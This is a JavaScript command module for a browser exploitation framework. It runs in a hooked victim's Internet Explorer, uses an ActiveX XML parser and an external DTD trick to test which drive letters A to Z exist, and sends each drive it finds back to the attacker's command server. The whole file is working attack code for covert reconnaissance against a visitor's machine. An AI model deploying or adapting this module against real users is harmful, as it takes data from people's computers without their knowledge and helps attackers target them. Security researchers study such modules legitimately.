//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {

  if (!("ActiveXObject" in window)) {
    server.debug('[Detect Users] Unspported browser');
    server.net.send('<%= @command_url %>', <%= @command_id %>,'fail=unsupported browser', server.are.status_error());
    return false;
  }

  function detect_drive(drive) {
    var dtd = drive + ':\\';
    var xml = '<?xml version="1.0" ?><!DOCTYPE anything SYSTEM "' + dtd + '">';
    var xmlDoc = new ActiveXObject("Microsoft.XMLDOM");
    xmlDoc.async = true;
    try {
      xmlDoc.loadXML(xml);
      return xmlDoc.parseError.errorCode == 0 ? true : false;
    } catch (e) {
      return true;
    }
  }

  // Detect drives: A - Z
  for (var i = 65; i <= 90; i++) {
    var drive = String.fromCharCode(i);
    server.debug('[Detect Local Drives] Checking for drive: ' + drive);
    var result = detect_drive(drive);
    if (result) {
      server.debug('[Detect Local Drives] Found drive: ' + drive);
      server.net.send('<%= @command_url %>', <%= @command_id %>,'result=Found drive: ' + drive, server.are.status_success());
    }
  }

});

